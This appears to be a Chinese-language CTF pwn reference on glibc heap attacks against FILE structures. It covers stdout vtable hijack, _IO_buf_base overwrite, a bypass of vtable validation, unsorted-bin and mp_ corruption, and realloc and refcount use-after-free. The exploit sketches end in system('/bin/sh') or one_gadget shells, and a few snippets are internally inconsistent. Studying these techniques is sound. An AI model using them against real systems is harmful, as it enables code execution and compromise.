# CTF Pwn - Heap FILE 结构攻击

针对 libc 2.23-2.27+ 的 FILE 结构（_IO_FILE）利用：fastbin→stdout vtable 劫持、_IO_buf_base 空字节覆盖、glibc 2.24+ vtable 验证绕过、对 FILE 字段的 unsorted-bin 攻击，以及通过这些 FILE 原语触发的菜单驱动 UAF / 引用计数漏洞。经典堆攻击（House of *、unlink、tcache、musl）请参见 [heap-techniques.md](heap-techniques.md)。

## 目录
- [针对 PIE + Full RELRO 的 Fastbin stdout Vtable 两阶段劫持（ASIS CTF 2017）](#fastbin-stdout-vtable-two-stage-hijack-for-pie--full-relro-asis-ctf-2017)
- [_IO_buf_base 空字节覆盖实现 stdin 劫持（Tokyo Westerns 2017）](#_io_buf_base-null-byte-overwrite-for-stdin-hijack-tokyo-westerns-2017)
- [glibc 2.24+ _IO_FILE Vtable 验证绕过（HITCON 2017）](#glibc-224-_io_file-vtable-validation-bypass-hitcon-2017)
- [对 stdin _IO_buf_end 的 Unsorted Bin 攻击（HITCON 2017）](#unsorted-bin-attack-on-stdin-_io_buf_end-hitcon-2017)
- [通过 mp_ 结构的 Unsorted Bin 损坏（HITCON 2017）](#unsorted-bin-corruption-via-mp_-structure-hitcon-2017)
- [realloc(ptr, 0) 作为 free() 实现 UAF（AceBear 2018）](#reallocptr-0-as-free-for-uaf-acebear-2018)
- [单字节引用计数器绕回导致 UAF（WhiteHat Grand Prix 2018）](#single-byte-reference-counter-wraparound-to-uaf-whitehat-grand-prix-2018)

---

## 针对 PIE + Full RELRO 的 Fastbin stdout Vtable 两阶段劫持（ASIS CTF 2017）

**模式：** 当 PIE 和 Full RELRO 阻止 GOT 覆盖时，利用 fastbin 攻击定位 libc 的 stdout FILE 结构，采用两阶段 vtable 劫持。

```python
from pwn import *

# 阶段 1：针对 stdout 内部伪 chunk 的 fastbin 双重释放
# 利用 libc stdout 区域中的 0x7f 字节作为伪 chunk 大小（匹配 0x70 fastbin）
fake_chunk_addr = libc.sym['_IO_2_1_stdout_'] + 0x91  # 包含 0x7f 字节

# 0x70 fastbin 双重释放
alloc_a = malloc(0x60)
alloc_b = malloc(0x60)
free(alloc_a)
free(alloc_b)
free(alloc_a)  # 双重释放：fastbin 0x70 = [a -> b -> a]

# 将 fastbin 重定向到 stdout 区域
malloc(0x60, p64(fake_chunk_addr))  # a 的 fd 指向 stdout 中的伪 chunk
malloc(0x60)                         # 返回 b
malloc(0x60)                         # 再次返回 a

# 阶段 2a：首次 vtable 覆盖 → gets()
# rdi 指向 stdout 结构，因此 gets(stdout) 将输入读入 stdout
fake_stdout_chunk = malloc(0x60)     # 返回与 stdout 重叠的伪 chunk
write_to(fake_stdout_chunk, p64(gets_addr))  # vtable 指向 gets

# 阶段 2b：gets() 再次覆盖 stdout vtable → system()
# 下一次 puts() 调用触发：vtable 查找 → gets(stdout)
# gets() 从 stdin 读取数据覆盖 stdout 结构，再次覆盖 vtable
# 输入："1\x80;/bin/sh;" — 新 vtable 指向 system()
# gets() 返回后，下一次输出调用触发 system()
```

**关键洞察：** libc stdout 区域中自然存在的 0x7f 字节满足 fastbin 0x70 大小验证。两阶段劫持：先将 vtable 重定向到 `gets()`（因为 rdi=stdout FILE*），然后 `gets()` 读取第二个指向 `system()` 的 vtable 和命令字符串。该技术即使在 PIE + Full RELRO 下也有效，因为它针对的是 libc 可写数据段，而非 GOT。

**识别时机：** 挑战具备 PIE + Full RELRO，且存在堆 UAF 或双重释放。libc FILE 结构中的 0x7f 字节是通用的 fastbin 目标。检查 `_IO_2_1_stdout_` 区域是否有适合作为伪 chunk 大小的 0x7f 字节。

**参考：** ASIS CTF 2017

---

## _IO_buf_base 空字节覆盖实现 stdin 劫持（Tokyo Westerns 2017）

**模式：** 一个空字节（off-by-one）堆溢出破坏了 stdin 的 `_IO_FILE` 结构中 `_IO_buf_base` 的最低有效字节。这样将 stdin 输入缓冲区指针重定向到 `_short_buf` —— 一个位于 FILE 结构内部的小缓冲区。随后 `scanf`/`fgets` 调用直接将攻击者输入写入 FILE 结构，实现对 `_IO_buf_base`/`_IO_buf_end` 的任意地址覆盖，获得完整写入原语。

**工作原理：**
```c
// 空字节覆盖目标为 _IO_buf_base 的最低有效字节
// 之前：_IO_buf_base = 0x7f...XX00  （指向堆上的输入缓冲区）
// 之后：_IO_buf_base = 0x7f...0000  （指向 FILE 结构本身，
//                                     靠近 _short_buf）
// 下一次 scanf() / fgets() 将输入写入 FILE 结构
// 覆盖 _IO_buf_base/_IO_buf_end 字段为任意地址
// 现在 stdin 从攻击者控制的内存地址读取
```

**利用链：**
```python
# 1. 堆布局：分配一个块紧邻 stdin 的 _IO_buf_base
#    （需要堆整理使 chunk 紧邻 FILE 结构）

# 2. 空字节溢出：在 chunk 边界写入一个 0x00 字节
#    → 破坏 _IO_buf_base 的最低有效字节
#    → 指向 FILE 结构内部

# 3. 下一次读取（scanf/fgets）：输入写入 FILE 结构字段
#    → 覆盖 _IO_buf_base = 目标地址，_IO_buf_end = 目标地址 + 大小

# 4. 再次读取：stdin 从目标地址读取 → 任意写入原语
#    → 覆盖 __free_hook 为 system() 或 one_gadget

# 5. 触发：调用带有受控指针的 free()
#    → system("/bin/sh")
```

**关键洞察：** 空字节溢出到 stdin 的 `_IO_buf_base`，将输入缓冲区重定位到 FILE 结构内部，通过标准 I/O 函数实现任意写入。FILE 结构中的 `_short_buf` 字段是最低有效字节清零时的自然落点。

**参考：** Tokyo Westerns CTF 2017

---
## glibc 2.24+ _IO_FILE Vtable 验证绕过 (HITCON 2017)

**模式：** glibc 2.24+ 会将 vtable 指针与 `_IO_vtables` 段进行验证，拒绝该范围外的指针。绕过方法：使用通过两跳解引用可达的未检查子函数入口。安排两个堆指针相距 0x10 字节（通过 unsorted bin 的 fd/bk）。第一个指针设置为 `valid_vtable_addr - 0x18`；第二个指针设置为 `system()`。`_IO_flush_all_lockp` 解引用 `*(addr + 0xd8) + 0x18`，进入未检查的子函数，该子函数调用 `*(addr + 0xe8)`。

**两跳绕过的工作原理：**
```c
// _IO_flush_all_lockp 调用：
//   fp->vtable->_IO_overflow(fp)
// 使用有效的 vtable 地址但偏移技巧：
//   vtable[offset] → 指向 vtable 验证外的子函数
//   子函数进一步解引用 → 调用 system()

// 使用 unsorted bin fd/bk（相距 0x10）构造堆布局：
//   [heap + 0x00]: valid_vtable_addr - 0x18   （在偏移 0xd8 处通过 vtable 检查）
//   [heap + 0x10]: system()                   （通过 *(addr + 0xe8) 解引用调用）
```

**设置：**
```python
# 使用 unsorted bin 的 fd/bk 作为写入目标，放置两个相距 0x10 的指针
# unsorted bin 攻击：写入 main_arena+88 到目标，泄露堆/libc
# 构造 FILE 结构，_flags = " sh\x00" 作为 system() 参数
# 触发 exit() → _IO_flush_all_lockp → 两跳调用 → system("sh")
```

**关键洞察：** Vtable 验证检查地址范围，但不检查通过子函数可达的间接入口——两跳调用链绕过了 `__IO_vtable_check`。unsorted bin 中 chunk 的 fd/bk 指针正好相距 0x10 字节，天然适合构造两个相邻指针槽。

**参考：** HITCON CTF 2017

---

## 对 stdin _IO_buf_end 的 Unsorted Bin 攻击 (HITCON 2017)

**模式：** 一个 off-by-one 的 NULL 字节导致堆 chunk 重叠。释放到 unsorted bin 后，利用 unsorted bin 攻击（破坏 unsorted bin chunk 的 `bk`）覆盖 stdin 的 FILE 结构中的 `_IO_buf_end` 为 libc 中的一个大地址（main_arena+88）。下一次 `scanf` 调用将攻击者数据读入 libc 的 stdin 缓冲区区域，从而实现对 `__malloc_hook` 的 one_gadget 覆盖。

**利用链：**
```python
# 1. Off-by-one NULL：破坏下一个 chunk 的 PREV_INUSE，设置 prev_size
#    → 通过堆合并创建重叠 chunk

# 2. 释放受害 chunk 到 unsorted bin
#    → victim->fd = main_arena+88，victim->bk = main_arena+96

# 3. Unsorted bin 攻击：设置 victim->bk = &stdin._IO_buf_end - 0x10
#    当 malloc() 从 unsorted bin 移除 victim：
#    → victim->bk->fd = victim   （写入堆地址到 _IO_buf_end）
#    但完整攻击中：设置 bk = &target - 0x10 以写入 main_arena+88

# 4. stdin._IO_buf_end 变为大值 → 下一次 scanf 读取大量输入
#    → 攻击者数据写入 libc stdin 缓冲区
#    → __malloc_hook 被 one_gadget 覆盖

# 5. 触发：任意 malloc() 调用 → __malloc_hook → one_gadget → shell
```

**关键洞察：** 对 `_IO_buf_end` 的 unsorted bin 攻击使 scanf 从 libc 数据段内攻击者控制的缓冲区读取。由于 `__malloc_hook` 位于 libc stdin 缓冲区附近，一次大规模读取即可覆盖它为 one_gadget 地址。

**参考：** HITCON CTF 2017

---

## 通过 mp_ 结构的 Unsorted Bin 破坏 (HITCON 2017)

**模式：** glibc 的 `mp_`（`malloc_par`）全局结构位于 libc 数据段的 unsorted bin 附近。堆溢出结合 unsorted bin 破坏覆盖 `mp_->bk` 为 `mp_` 内部地址。`mp_` 结构包含的字段被当作空闲 chunk 头时，能通过 unsorted bin 验证（`size < system_mem`）。从这个“chunk”分配内存可写入 `mp_` 内部，从而覆盖 `__malloc_hook`。需要部分 ASLR 暴力破解（1/16 概率）以对齐堆地址。

**为何 mp_ 可用：**
```c
// mp_ 布局（glibc 2.23，位于 libc BSS 中 unsorted bin 附近）：
// struct malloc_par {
//   unsigned long  trim_threshold;   // 偏移 0x00 — 大值，满足 size 检查
//   unsigned long  top_pad;          // 偏移 0x08
//   ...
//   unsigned long  system_mem;       // 偏移 0x48 — 必须大于伪 chunk 大小
// };
// mp_.trim_threshold 被当作 chunk size 解释 → 满足 unsorted bin 检查
// 从 mp_ 伪 chunk 分配返回重叠 mp_ 字段的内存
// 在 mp_ 内写入 __malloc_hook 偏移 → 控制下一次 malloc → one_gadget
```

**利用过程：**
```python
# 堆溢出：破坏 unsorted bin chunk 的 bk 指向 mp_
corrupted_bk = mp_addr + FAKE_CHUNK_OFFSET  # size 字段看起来有效的偏移

# 触发 unsorted bin 遍历：malloc() 适当大小
# → unsorted bin 解除链接 mp_ 伪 chunk
# → 返回指向 mp_ 数据的指针
# 写入 one_gadget 到返回 chunk 内的 __malloc_hook 偏移
malloc(size)  # 返回 mp_+0x10
write_to_result(one_gadget)  # 覆盖 __malloc_hook

# 触发：下一次 malloc() → __malloc_hook → one_gadget → shell
```

**关键洞察：** glibc 的 `mp_` 全局结构自然通过 unsorted bin 验证——其 `trim_threshold` 字段作为伪 chunk 大小非常可信。通过 unsorted bin 破坏植入的伪空闲 chunk 允许直接分配到 glibc 元数据，免去了构造堆侧伪 chunk 的需求。

**参考：** HITCON CTF 2017

---
## realloc(ptr, 0) 作为 free() 导致的 UAF（AceBear 2018）

**模式：** 在许多 glibc 版本中，`realloc(ptr, 0)` 的行为类似于 `free(ptr)`，将内存块返回到空闲链表，但应用程序可能仍保留旧指针 —— 从而产生 use-after-free。

**工作原理：**
```c
// C 标准规定 realloc(ptr, 0) 是实现定义的
// 在 glibc 中：realloc(ptr, 0) 调用 free(ptr) 并返回 NULL
// 如果应用程序不检查返回值：
void *ptr = malloc(0x80);
ptr = realloc(ptr, 0);    // ptr 现在为 NULL，内存块被释放
// 但如果应用程序单独保存了旧指针：
void *saved = ptr;
ptr = realloc(ptr, 0);    // 已释放，但 saved 仍指向已释放的内存块
// saved 现在是悬空指针 → UAF
```

**利用示例：**
```python
from pwn import *

# 第一步：分配一个内存块
add(0, 0x80, b"AAAA")  # 索引 0 处的内存块

# 第二步：触发 realloc，大小为 0
# 内部调用 realloc(ptr, 0) 释放内存块
edit(0, size=0)  # realloc(ptr, 0) = free(ptr)
# ptr 现在已释放，但应用程序仍持有索引 0 的指针

# 第三步：分配新内存块，重用已释放的内存
add(1, 0x80, b"BBBB")  # 获得与已释放内存块相同的地址

# 第四步：通过原索引 0 读取 → 读取到索引 1 中攻击者控制的数据
# 或：通过索引 0 写入，破坏索引 1 的内存块
view(0)  # UAF 读取 — 看到索引 1 写入的 "BBBB"
```

**Tcache 变体（glibc 2.26+）：**
```python
# realloc(ptr, 0) 会将内存块放入 tcache bin
# 随后同样大小的 malloc 会返回相同内存块
# 双重引用导致 tcache 污染：

add(0, 0x80, b"AAAA")
edit(0, size=0)           # 通过 realloc 释放 → tcache[0x90]
add(1, 0x80, p64(target)) # 重用已释放内存块，写入伪造的 fd 指针
# 如果索引 0 仍引用该内存块：
edit(0, size=0)           # 通过 realloc 双重释放 → tcache 污染
add(2, 0x80, b"CCCC")    # 返回已释放内存块
add(3, 0x80, payload)    # 返回目标地址 → 任意写
```

**关键洞察：** `realloc(ptr, 0)` 是实现定义的。在 glibc 中，它会释放内存块并返回 NULL。如果应用程序不检查返回值或仍使用旧指针，就会产生 UAF。重点查找 size 参数可被用户控制的 `realloc` 调用 —— 将其设置为 0 会触发释放行为，而不经过应用程序正常的删除/释放路径，可能绕过删除处理中的引用计数或指针置空。

**识别时机：** 挑战中使用 `realloc` 进行大小调整，且大小由用户控制。编辑或调整大小功能内部调用 `realloc` —— 检查 size=0 是否被特殊处理或直接传递。还要检查是否用 `realloc` 的返回值更新存储的指针（如果没有，旧指针就成了悬空指针）。

**参考资料：** AceBear 2018

---

## 单字节引用计数溢出导致 UAF（WhiteHat Grand Prix 2018）

**模式：** 一个结构体在 `uint8_t` 字段中存储自身的引用计数。对象仅在 `refcount == 0` 时释放，但由于计数器在 256 时回绕，调用 256 次 `addref()` 会使 `refcount` 回到零，而所有持有的句柄仍然持有有效指针。下一次调用 `release()` 会释放对象 —— 其他所有句柄变成悬空。

**利用示意：**
```c
struct Book {
    uint8_t refcount;     // 1 字节 — 易受攻击
    char title[32];
    void (*read)(struct Book*);
};

// 1. create(h0)                    refcount = 1
// 2. dup(h0) → h1 ... h256         refcount 回绕 1 → 2 → ... → 0
// 3. release(h1)                   refcount = 255（下溢）→ 对象被释放
// 4. 堆重新分配，填充相同内存块为攻击者数据
// 5. read(h0)                      调用攻击者控制的虚表指针
```

**关键洞察：** 任何用于管理生命周期的计数器必须足够宽，以超过程序在一次会话中能创建的句柄数。`uint8_t` 引用计数总是危险信号 —— 需确认 `addref` 路径是否饱和（保持在 255）或使用更宽的类型。该利用只需 256 次 `addref` 调用和一次额外的 `release`，即使句柄 API 有严格速率限制也能实现。

**参考资料：** WhiteHat Grand Prix 2018 — writeup 10809
